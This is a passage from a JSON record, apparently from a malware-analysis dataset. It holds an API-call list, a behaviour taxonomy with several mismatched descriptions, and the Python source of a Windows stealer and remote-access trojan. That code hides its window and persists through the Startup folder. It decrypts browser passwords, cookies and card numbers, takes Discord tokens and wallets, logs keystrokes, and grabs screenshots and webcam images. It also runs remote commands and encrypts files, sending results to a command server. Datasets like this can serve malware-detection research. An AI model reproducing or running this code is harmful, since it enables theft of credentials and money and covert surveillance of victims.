        "open(f'{path}/{filename}', errors='ignore')",
        "open(f'{path}/{filename}', errors='ignore').readlines()",
        "re.findall(self.regexp_enc, line)",
        "base64.b64decode(y.split('dQw4w9WgXcQ:')[1])",
        "CryptUnprotectData(master_key, None, None, None, 0)[1]",
        "AES.new(master_key, AES.MODE_GCM, iv)",
        "cipher.decrypt(payload)",
        "os.listdir(path)",
        "open(f'{path}/{filename}', errors='ignore')",
        "open(f'{path}/{filename}', errors='ignore').readlines()",
        "re.findall(self.regexp, line)",
        "os.path.exists(roaming+\"/Mozilla/Firefox/Profiles\")",
        "os.walk(roaming+\"/Mozilla/Firefox/Profiles\")",
        "open(f'{path}/{file}', errors='ignore')",
        "open(f'{path}/{file}', errors='ignore').readlines()",
        "re.findall(self.regexp, line)",
        "os.popen('wmic csproduct get uuid')",
        "os.popen('wmic csproduct get uuid').read()",
        "requests.get('https://api.ipify.org')",
        "os.getenv(\"UserName\")",
        "os.getenv(\"COMPUTERNAME\")",
        "platform.system()",
        "platform.version()",
        "socket.gethostname()",
        "socket.gethostbyname(socket.gethostname())",
        "platform.machine()",
        "os.getenv('temp') + \"/\" + \"image.png\"",
        "ImageGrab.grab()",
        "screenshot.save(path)",
        "cv2.VideoCapture(0)",
        "cap.isOpened()",
        "cap.read()",
        "os.getenv('temp') + \"/\" + \"webcam-photo.png\"",
        "cv2.imwrite(filename, frame)",
        "cap.release()",
        "os.path.join(os.path.expanduser(\"~\"), \"Downloads\")",
        "os.path.join(os.path.expanduser(\"~\"), \"Desktop\")",
        "os.path.join(os.path.expanduser(\"~\"), \"Documents\")",
        "os.path.join(os.path.expanduser(\"~\"), \"OneDrive\")",
        "os.path.join(os.path.expanduser(\"~\"), \"Videos\")",
        "os.path.exists(path)",
        "os.chdir(path)",
        "os.listdir(path)",
        "zipfile.ZipFile(zip_name, \"w\")",
        "os.listdir(path)",
        "f.write(file)",
        "open(zipfile, \"rb\")",
        "f.read()",
        "os.walk(path)",
        "open(os.path.join(act, file), \"rb\")",
        "open(os.path.join(act, file), \"rb\").read()",
        "os.rename(file, self.fernet.encrypt(os.path.basename(file)).decode() + \".exe\")",
        "self.fernet.encrypt(f.read())",
        "open(file, 'rb')",
        "self.fernet.encrypt(f.read())",
        "open(file, 'wb')",
        "self.fernet.decrypt(f.read())",
        "open(file, 'wb')",
        "keyboard.hook(self.keylog_event)",
        "time.time()",
        "time.time()",
        "keyboard.unhook_all()",
        "sio.emit('keylog-response', self.data)",
        "sio.emit('command-response', os.popen(cmd['cmd']).read())",
        "os.popen(cmd['cmd'])",
        "os.popen(cmd['cmd']).read()",
        "sio.emit('history-response', GrabbBrowsers().start('history'))",
        "sio.emit('discord-tokens-response', information['tokens'])",
        "GetTokens().start()",
        "time.sleep(5)",
        "sio.emit('cards-response', GrabbBrowsers().start('cards'))",
        "sio.emit('passwords-response', GrabbBrowsers().start('passwords'))",
        "os.path.exists(filename)",
        "open(filename, \"rb\")",
        "f.read()",
        "sio.emit('download-response', {'file.' + filename.split('.')[-1]: data})",
        "sio.emit('download-response', False)",
        "sio.emit('backup-codes-response', FileMagnament().getBackupCodes())",
        "sio.emit('cookies-response', GrabbBrowsers().start('cookies'))",
        "GrabbBrowsers().start('all',)",
        "sio.emit('browsers-response', information['browsers'])",
        "webbrowser.open(url)",
        "sio.emit('website-response', True)",
        "requests.get(args['url'])",
        "open(args['path'], \"wb\")",
        "f.write(response.content)",
        "sio.emit('upload-response', True)",
        "threading.Thread(target=ctypes.windll.user32.MessageBoxW, args=(0, alert, '#YeezyGvng & #WapnedGvng', 0x10,)).start()",
        "sio.emit('alert-response', True)",
        "sio.emit('wallets-response', FileMagnament().basicGrb(wallets=True))",
        "sio.emit('gamestores-response', FileMagnament().basicGrb(relevant=True))",
        "Obj.screenshot()",
        "open(Obj.screenshot(), 'rb')",
        "image_file.read()",
        "sio.emit('screenshot-response', image_data)",
        "Obj.webcam()",
        "open(file, 'rb')",
        "image_file.read()",
        "sio.emit('webcam-response', image_data)",
        "requests.get('https://api.ipify.org').text",
        "sio.emit('ip-response', requests.get('https://api.ipify.org').text)",
        "webbrowser.open(url=url)",
        "sio.emit('website-response', webbrowser.open(url=url))",
        "Encrypter(file, key).encryptFiles()",
        "sio.emit('encrypt-response', Encrypter(file, key).encryptFiles())",
        "Encrypter(file, key).decryptFiles()",
        "sio.emit('decrypt-response', Encrypter(file, key).decryptFiles())",
        "Obj.getInformation()",
        "sio.emit('information-response', Obj.getInformation())",
        "threading.Thread(target=KeyLogger().start).start()",
        "sio.emit('initkeylog-response', True)",
        "keylogthread.join()",
        "sio.emit('initkeylog-response', False)",
        "os.path.exists(path)",
        "os.listdir(path)",
        "sio.emit('listdir-response', {\"path\": path, \"files\":os.listdir(path)})",
        "sio.emit('listdir-response', False)",
        "Startup()",
        "FileMagnament().basicGrb(wallets=True, read=False)",
        "GrabbBrowsers().start('all')",
        "GetTokens().start()",
        "requests.post(url=f'{api_url}/api/{user_id}/', json=information)",
        "requests.post(url=f'{api_url}/api/{user_id}/wallets/', files=wallets_)",
        "sio.connect(api_url)",
        "sio.wait()",
        "sio.disconnect()"
      ],
      "mapped_sequence": [
        {
          "api_name": "win32console.GetConsoleWindow",
          "id": "find_window_by_title",
          "description": "Finds window handle by title",
          "first_id": "system_operations",
          "second_id": "window_management",
          "third_id": "window_finding"
        },
        {
          "api_name": "win32gui.ShowWindow",
          "id": "change_window_position",
          "description": "Changes window position and Z-order",
          "first_id": "system_operations",
          "second_id": "window_management",
          "third_id": "window_control"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "shutil.copy",
          "id": "copy_file",
          "description": "Copies file to destination, preserving metadata",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "json.load",
          "id": "deserialize_from_json",
          "description": "Deserializes JSON string to Python object",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "CryptUnprotectData",
          "id": "decrypt_dpapi_data",
          "description": "Decrypts Windows DPAPI-encrypted data",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "decryption_execution"
        },
        {
          "api_name": "AES.new",
          "id": "init_aes_cipher",
          "description": "Initializes AES cipher with provided key",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "encryption_initialization"
        },
        {
          "api_name": "AES.new.decrypt",
          "id": "decrypt_aes_data",
          "description": "Decrypts data using initialized AES cipher",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "decryption_execution"
        },
        {
          "api_name": "sqlite3.connect",
          "id": "open_sqlite_db",
          "description": "Opens SQLite database file",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Connection.cursor",
          "id": "create_sql_cursor",
          "description": "Creates cursor object for SQLite connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Cursor.execute",
          "id": "execute_sql_query",
          "description": "Executes SQL query on SQLite connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Cursor.fetchall",
          "id": "fetch_sql_rows",
          "description": "Fetches all rows from last executed query",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Connection.close",
          "id": "close_sqlite_connection",
          "description": "Closes the SQLite database connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "os.remove",
          "id": "delete_file",
          "description": "Deletes specified file from filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "os.listdir",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "re.findall",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "os.walk",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "os.popen",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "os.popen.read",
          "id": "read_process_stdout",
          "description": "Reads all bytes from process standard output",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_information"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "platform.system",
          "id": "get_os_id",
          "description": "Retrieves operating system identifier",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "platform.version",
          "id": "get_os_version",
          "description": "Retrieves operating system version",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "socket.gethostname",
          "id": "get_hostname",
          "description": "Retrieves current host name",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "address_information"
        },
        {
          "api_name": "socket.gethostbyname",
          "id": "resolve_hostname",
          "description": "Resolves host name to IPv4 address",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "domain_resolution"
        },
        {
          "api_name": "platform.machine",
          "id": "get_machine_type",
          "description": "Retrieves machine type, e.g., 'x86_64'",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "hardware_information"
        },
        {
          "api_name": "ImageGrab.grab",
          "id": "capture_entire_screen",
          "description": "Captures screenshot of the entire screen",
          "first_id": "information_gathering",
          "second_id": "multimedia_capture",
          "third_id": "screen_capture"
        },
        {
          "api_name": "ImageGrab.Image.save",
          "id": "save_image_file",
          "description": "Saves image to file in PNG format",
          "first_id": "information_gathering",
          "second_id": "multimedia_capture",
          "third_id": "image_processing"
        },
        {
          "api_name": "cv2.VideoCapture",
          "id": "create_video_capture",
          "description": "Creates video capture object for default camera",
          "first_id": "information_gathering",
          "second_id": "multimedia_capture",
          "third_id": "camera_operations"
        },
        {
          "api_name": "cv2.VideoCapture.isOpened",
          "id": "read_video_frame",
          "description": "Reads frame from video capture device",
          "first_id": "information_gathering",
          "second_id": "multimedia_capture",
          "third_id": "camera_operations"
        },
        {
          "api_name": "cv2.VideoCapture.read",
          "id": "read_video_frame",
          "description": "Reads frame from video capture device",
          "first_id": "information_gathering",
          "second_id": "multimedia_capture",
          "third_id": "camera_operations"
        },
        {
          "api_name": "cv2.imwrite",
          "id": "save_image_file",
          "description": "Saves image to file in PNG format",
          "first_id": "information_gathering",
          "second_id": "multimedia_capture",
          "third_id": "image_processing"
        },
        {
          "api_name": "cv2.VideoCapture.release",
          "id": "release_video_device",
          "description": "Releases video capture device",
          "first_id": "information_gathering",
          "second_id": "multimedia_capture",
          "third_id": "camera_operations"
        },
        {
          "api_name": "os.path.expanduser",
          "id": "path_special_operations",
          "description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.chdir",
          "id": "change_working_dir",
          "description": "Changes current working directory",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "zipfile.ZipFile",
          "id": "open_zip_write",
          "description": "Opens ZIP archive for writing",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "zipfile.ZipFile.write",
          "id": "add_file_zip",
          "description": "Adds file to ZIP archive with specified archive name",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "os.rename",
          "id": "rename_file",
          "description": "Renames file or moves it to new location",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "Fernet.encrypt",
          "id": "encrypt_files",
          "description": "Encrypts files using provided key",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "encryption_execution"
        },
        {
          "api_name": "Fernet.decrypt",
          "id": "decrypt_fernet_data",
          "description": "Decrypts Fernet-encrypted data",
          "first_id": "command_control_communications",
          "second_id": "communication_concealment",
          "third_id": "encrypted_channels"
        },
        {
          "api_name": "keyboard.hook",
          "id": "remove_keyboard_hooks",
          "description": "Removes all keyboard hooks",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "keyboard_monitoring"
        },
        {
          "api_name": "time.time",
          "id": "get_current_time",
          "description": "Returns current time in seconds since epoch",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        },
        {
          "api_name": "keyboard.unhook_all",
          "id": "remove_keyboard_hooks",
          "description": "Removes all keyboard hooks",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "keyboard_monitoring"
        },
        {
          "api_name": "sio.emit",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "time.sleep",
          "id": "suspend_execution",
          "description": "Suspends execution for specified seconds",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        },
        {
          "api_name": "webbrowser.open",
          "id": "open_file_app",
          "description": "Opens file with associated application",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "threading.Thread",
          "id": "create_thread",
          "description": "Creates new thread to execute target function",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_creation"
        },
        {
          "api_name": "ctypes.windll.user32.MessageBoxW",
          "id": "display_message_box",
          "description": "Displays message box with specified text and options",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "system_interface_usage"
        },
        {
          "api_name": "threading.Thread.start",
          "id": "start_thread",
          "description": "Starts thread execution",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        },
        {
          "api_name": "threading.Thread.join",
          "id": "wait_thread",
          "description": "Waits for thread to finish execution",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        },
        {
          "api_name": "Startup",
          "id": "init_startup_class",
          "description": "Instantiates Startup class",
          "first_id": "data_exfiltration",
          "second_id": "data_transmission_channels",
          "third_id": "exfiltration_channel_establishment"
        },
        {
          "api_name": "sio.connect",
          "id": "create_http_connection",
          "description": "Creates HTTP connection to specified host",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_creation"
        },
        {
          "api_name": "sio.wait",
          "id": "wait_thread",
          "description": "Waits for thread to finish execution",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        },
        {
          "api_name": "sio.disconnect",
          "id": "close_socket",
          "description": "Closes the socket connection",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "connection_management"
        }
      ],
      "contextual_code": "import win32gui, win32console\nwin32gui.ShowWindow(win32console.GetConsoleWindow(), 0)\nfrom cryptography.fernet import Fernet\nimport os, shutil, json, base64, sqlite3, re, requests, platform, socket, cv2, zipfile, threading, ctypes, time, webbrowser, keyboard\nfrom win32crypt import CryptUnprotectData\nfrom Crypto.Cipher import AES\nfrom PIL import ImageGrab\n\n# Startup persistence\nclass Startup:\n    def __init__(self) -> None:\n        self.filename = sys.argv[0]\n        self.path = f\"C:/Users/{os.getenv('username')}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/bit64start.{self.filename.split('.')[-1]}\"\n        if not os.path.exists(self.path):\n            shutil.copy(self.filename, self.path)\n\n# Browser data extraction (passwords, cookies, cards, history)\nclass Browser:\n    def get_master_key(self) -> bytes:\n        with open(os.path.join(self.path, \"Local State\"), \"r\", encoding=\"utf-8\") as f:\n            local_state = json.load(f)\n        master_key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])[5:]\n        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]\n        return master_key\n    def decrypt(self, buff: bytes) -> str:\n        iv, payload = buff[3:15], buff[15:]\n        cipher = AES.new(self.master_key, AES.MODE_GCM, iv)\n        decrypted_pass = cipher.decrypt(payload)[:-16].decode()\n        return decrypted_pass\n    def create_temporal_db(self, db) -> str:\n        if os.path.exists(db):\n            copy_path = wapned_path + random_name(10)\n            try:\n                shutil.copy(db, copy_path)\n            except Exception as e:\n                return False\n            return copy_path\n        else:\n            return False\n    def cards(self) -> None:\n        for profile in self.profiles:\n            original_db = self.path + profile + \"/Web Data\"\n            temporal_db = self.create_temporal_db(original_db)\n            if not temporal_db: return\n            conn = sqlite3.connect(temporal_db)\n            cursor = conn.cursor()\n            cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')\n            cards = [\n                {\n                \"name\":info[0],\n                \"month\":info[1],\n                \"year\":info[2],\n                \"number\":self.decrypt(info[3]),\n                \"date_modified\":info[4]\n                }for info in cursor.fetchall()\n                if info[0] or info[1] or info[2] or info[3]\n            ]\n            conn.close()\n            os.remove(temporal_db)\n            return cards\n    def passwords(self) -> None:\n        for profile in self.profiles:\n            original_db = self.path + profile + \"/Login Data\"\n            temporal_db = self.create_temporal_db(original_db)\n            if not temporal_db: return\n            conn = sqlite3.connect(temporal_db)\n            cursor = conn.cursor()\n            cursor.execute('SELECT action_url, username_value, password_value FROM logins')\n            passwords = [\n                {\n                \"url\":info[0],\n                \"username\":info[1],\n                \"password\":self.decrypt(info[2])\n                }for info in cursor.fetchall()\n                if info[2]\n            ]\n            conn.close()\n            os.remove(temporal_db)\n            return passwords\n    def history(self) -> None:\n        for profile in self.profiles:\n            original_db = self.path + profile + f\"/History\"\n            temporal_db = self.create_temporal_db(original_db)\n            if not temporal_db: return\n            conn = sqlite3.connect(temporal_db)\n            cursor = conn.cursor()\n            cursor.execute('SELECT url, title, last_visit_time FROM urls')\n            history = [\n                {\n                \"url\":info[0],\n                \"title\":info[1],\n                \"timestamp\":info[2]\n                }for info in cursor.fetchall()[0:1500]\n                if info[0] and info[1] and info[2]\n            ]\n            conn.close()\n            os.remove(temporal_db)\n            return history\n    def cookies(self) -> None:\n        for profile in self.profiles:\n            original_db = self.path + profile + f\"/Network/Cookies\"\n            temporal_db = self.create_temporal_db(original_db)\n            if not temporal_db:\n                return\n            conn = sqlite3.connect(temporal_db)\n            cursor = conn.cursor()\n            cursor.execute('SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')\n            cookies = [\n                {\n                \"url\":info[0],\n                \"expires\":info[1],\n                \"path\":info[2],\n                \"name\":self.decrypt(info[3]),\n                \"value\":info[4]\n                }\n                for info in cursor.fetchall()\n                if info[0] and info[1] and info[2] and info[3] and info[4]\n            ]\n            conn.close()\n            os.remove(temporal_db)\n            return cookies\n\n# Token extraction from Discord and browsers\nclass GetTokens:\n    def get_master_key(self, path: str) -> bytes:\n        with open(path, \"r\", encoding=\"utf-8\") as f:\n            c = f.read()\n        local_state = json.loads(c)\n        master_key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n        master_key = master_key[5:]\n        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]\n        return master_key\n    def decrypt_data(self, buff: bytes, master_key: bytes) -> str:\n        iv = buff[3:15]\n        payload = buff[15:]\n        cipher = AES.new(master_key, AES.MODE_GCM, iv)\n        decrypted_pass = cipher.decrypt(payload)\n        decrypted_pass = decrypted_pass[:-16].decode()\n        return decrypted_pass\n    def get_discord(self, name, path) -> None:\n        localstate = roaming+f'/{name.replace(\" \",\"\").lower()}/Local State'\n        if os.path.exists(localstate):\n            for filename in [filename for filename in os.listdir(path) if filename.split(\".\")[-1] in [\"log\", \"ldb\"]]:\n                for line in [x.strip() for x in open(f'{path}/{filename}', errors='ignore').readlines() if x.strip()]:\n                    for y in re.findall(self.regexp_enc, line):\n                        master_key = self.get_master_key(localstate)\n                        encrypted = base64.b64decode(y.split('dQw4w9WgXcQ:')[1])\n                        token = self.decrypt_data(encrypted, master_key)\n                        Token(token)\n    def get_browser(self, name, path) -> None:\n        for filename in [filename for filename in os.listdir(path) if filename.split(\".\")[-1] in [\"log\", \"ldb\"]]:\n            for line in [x.strip() for x in open(f'{path}/{filename}', errors='ignore').readlines() if x.strip()]:\n                for token in re.findall(self.regexp, line):\n                    Token(token)\n    def get_firefox(self) -> None:\n        if os.path.exists(roaming+\"/Mozilla/Firefox/Profiles\"):\n            for path, _, files in os.walk(roaming+\"/Mozilla/Firefox/Profiles\"):\n                for file in [file for file in files if file.endswith('.sqlite')]:\n                    for line in [x.strip() for x in open(f'{path}/{file}', errors='ignore').readlines() if x.strip()]:\n                        for token in re.findall(self.regexp, line):\n                            Token(token)\n\n# System info, screenshot, webcam\nclass Grabb:\n    def getInformation(self) -> dict:\n        try:\n            hwid = os.popen('wmic csproduct get uuid').read().split('\\n')[1].strip()\n        except:\n            hwid = \"None\"\n        ip_adress = requests.get('https://api.ipify.org').text\n        username = os.getenv(\"UserName\")\n        computername = os.getenv(\"COMPUTERNAME\")\n        information = {}\n        information[\"hwid\"]=hwid\n        information['username']=username\n        information['computername']=computername\n        information[\"os\"]=platform.system() + \" \" + platform.version()\n        information[\"ipv4\"]=socket.gethostbyname(socket.gethostname())\n        information[\"ip\"]=ip_adress\n        information[\"machine\"]=platform.machine()\n        return information\n    def screenshot(self) -> str:\n        path = os.getenv('temp') + \"/\" + \"image.png\"\n        screenshot = ImageGrab.grab()\n        screenshot.save(path)\n        return path\n    def webcam(self) -> str:\n        cap = cv2.VideoCapture(0)\n        if not cap.isOpened():\n            return\n        ret, frame = cap.read()\n        if not ret:\n            return\n        filename = os.getenv('temp') + \"/\" + \"webcam-photo.png\"\n        cv2.imwrite(filename, frame)\n        cap.release()\n        return filename\n\n# File management (zipping, reading, searching)\nclass FileMagnament:\n    @staticmethod\n    def convertPathToZip(name: str, path: str) -> None:\n        if os.path.exists(path):\n            zip_name = wapned_path + name.replace(\" \", \"\") + \".zip\"\n            os.chdir(path)\n            if len(os.listdir(path)) > 0:\n                with zipfile.ZipFile(zip_name, \"w\") as f:\n                    for file in os.listdir(path):\n                        f.write(file)\n            return zip_name\n    def basicGrb(self, wallets=False, relevant=False, read=True) -> dict:\n        for name, path in self.paths.items():\n            zipfile = self.convertPathToZip(name=name, path=path)\n            if zipfile != None:\n                if read:\n                    with open(zipfile, \"rb\") as f:\n                        file_data = f.read()\n                    self.files[zipfile.replace(wapned_path, \"\")]=file_data\n                else:\n                    self.files[zipfile.replace(wapned_path, \"\")]=open(zipfile, \"rb\")\n        return self.files\n    def searchFile(self, filename=None, filenames=None, path='C:/') -> str | dict:\n        for act, dirs, files in os.walk(path):\n            for file in files:\n                if filename != None:\n                    if filename.lower() in file.lower():\n                        self.filesfiles.append(os.path.join(act, file))\n                else:\n                    for file_ in filenames:\n                        if file_.lower() in file.lower():\n                            self.files[random_name(5) + \"-\" + file]=open(os.path.join(act, file), \"rb\").read()\n                            break\n    def getBackupCodes(self) -> dict:\n        for path in self.globals:\n            self.searchFile(filenames=[\"backup_codes\", \"discord_backup\", \"discord_codes\"], path=path)\n        return self.files\n\n# Fernet encryption/decryption\nclass Encrypter:\n    def __init__(self, path: str, key: str) -> None:\n        self.key = bytes(key, 'utf-8')\n        self.fernet = Fernet(self.key)\n        if os.path.isfile(path):\n            self.paths = [path]\n        if os.path.isdir(path):\n            self.paths = [os.path.join(path, file) for file, _, __ in os.walk(path)]\n    def encryptFiles(self) -> None:\n        for file in self.paths:\n            if os.path.exists(file):\n                self.encrypt_file(file)\n        return True\n    def decryptFiles(self) -> None:\n        for file in self.paths:\n            if os.path.exists(file):\n                self.decrypt_file(file)\n        return True\n    def encrypt_name(self, file: str) -> None:\n        os.rename(file, self.fernet.encrypt(os.path.basename(file)).decode() + \".exe\")\n    def encrypt_file(self, file: str) -> None:\n        with open(file, 'rb') as f:\n            e = self.fernet.encrypt(f.read())\n        with open(file, 'wb') as f:\n            f.write(e)\n    def decrypt_file(self, file: str) -> None:\n        with open(file, 'rb') as f:\n            e = self.fernet.decrypt(f.read())\n        with open(file, 'wb') as f:\n            f.write(e)\n\n# Keylogger\nclass KeyLogger:\n    def keylog_event(self, key) -> None:\n        if key.event_type == keyboard.KEY_DOWN:\n            self.data.append(key.name)\n            self.ultimatum = time.time()\n    def start(self) -> None:\n        global on\n        on = True\n        self.ultimatum = time.time()\n        keyboard.hook(self.keylog_event)\n        while on:\n            if self.ultimatum != None:\n                if (time.time() - self.ultimatum) > 5:\n                    self.ultimatum = None\n                    if len(self.data) > 100:\n                        self.send()\n        if not on:\n            keyboard.unhook_all()\n    def send(self) -> None:\n        sio.emit('keylog-response', self.data)\n        self.data = []\n\n# SocketIO event handlers (remote control)\n@sio.on('command')\ndef command(cmd):\n    sio.emit('command-response', os.popen(cmd['cmd']).read())\n@sio.on('history')\ndef history():\n    sio.emit('history-response', GrabbBrowsers().start('history'))\n@sio.on('discord-tokens')\ndef tokens():\n    information['tokens']=[]\n    GetTokens().start()\n    time.sleep(5)\n    sio.emit('discord-tokens-response', information['tokens'])\n@sio.on('cards')\ndef cards():\n    sio.emit('cards-response', GrabbBrowsers().start('cards'))\n@sio.on('passwords')\ndef passwords():\n    sio.emit('passwords-response', GrabbBrowsers().start('passwords'))\n@sio.on('download')\ndef download(filename: str):\n    if os.path.exists(filename):\n        with open(filename, \"rb\") as f:\n            data = f.read()\n        sio.emit('download-response', {'file.' + filename.split('.')[-1]: data})\n    else:\n        sio.emit('download-response', False)\n@sio.on('backup-codes')\ndef getBackupCodes():\n    sio.emit('backup-codes-response', FileMagnament().getBackupCodes())\n@sio.on('cookies')\ndef cookies():\n    sio.emit('cookies-response', GrabbBrowsers().start('cookies'))\n@sio.on('browsers')\ndef browsers():\n    GrabbBrowsers().start('all',)\n    sio.emit('browsers-response', information['browsers'])\n@sio.on('website')\ndef website(url: str):\n    try:\n        webbrowser.open(url)\n        sio.emit('website-response', True)\n    except:\n        sio.emit('website-response', False)\n@sio.on('upload')\ndef upload(args: dict):\n    try:\n        response = requests.get(args['url'])\n        if response.status_code == 200:\n            with open(args['path'], \"wb\") as f:\n                f.write(response.content)\n            sio.emit('upload-response', True)\n        else:\n            sio.emit('upload-response', False)\n    except Exception as e:\n        sio.emit('upload-response', False)\n@sio.on('alert')\ndef upload(alert: str):\n    threading.Thread(target=ctypes.windll.user32.MessageBoxW, args=(0, alert, '#YeezyGvng & #WapnedGvng', 0x10,)).start()\n    sio.emit('alert-response', True)\n@sio.on('wallets')\ndef wallets():\n    sio.emit('wallets-response', FileMagnament().basicGrb(wallets=True))\n@sio.on('gamestores')\ndef wallets():\n    sio.emit('gamestores-response', FileMagnament().basicGrb(relevant=True))\n@sio.on('screenshot')\ndef screenshot():\n    with open(Obj.screenshot(), 'rb') as image_file:\n        image_data = image_file.read()\n        sio.emit('screenshot-response', image_data)\n@sio.on('webcam')\ndef screenshot():\n    file = Obj.webcam()\n    with open(file, 'rb') as image_file:\n        image_data = image_file.read()\n        sio.emit('webcam-response', image_data)\n@sio.on('ip')\ndef screenshot():\n    sio.emit('ip-response', requests.get('https://api.ipify.org').text)\n@sio.on('website')\ndef screenshot(url: str):\n    sio.emit('website-response', webbrowser.open(url=url))\n@sio.on('encrypt')\ndef encrypt(data):\n    file = data['path']\n    key = data['key']\n    sio.emit('encrypt-response', Encrypter(file, key).encryptFiles())\n@sio.on('decrypt')\ndef decrypt(data):\n    file = data['path']\n    key = data['key']\n    sio.emit('decrypt-response', Encrypter(file, key).decryptFiles())\n@sio.on('information')\ndef info():\n    sio.emit('information-response', Obj.getInformation())\n@sio.on('initkeylog')\ndef info(data: bool):\n    global on\n    global keylogthread\n    if data:\n        if not on:\n            keylogthread = threading.Thread(target=KeyLogger().start).start()\n            sio.emit('initkeylog-response', True)\n        else:\n            sio.emit('initkeylog-response', 101)\n    else:\n        on = False\n        try:\n            keylogthread.join()\n        except:\n            pass\n        sio.emit('initkeylog-response', False)\n@sio.on('listdir')\ndef listdir(path: str):\n    if os.path.exists(path):\n        sio.emit('listdir-response', {\"path\": path, \"files\":os.listdir(path)})\n    else:\n        sio.emit('listdir-response', False)\n\ndef define_(id_: str, api_: str, init=True) -> None:\n    global user_id\n    user_id = id_\n    global api_url\n    api_url = api_\n    global information\n    if init:\n        Startup()\n        wallets_ = FileMagnament().basicGrb(wallets=True, read=False)\n        information = {\n            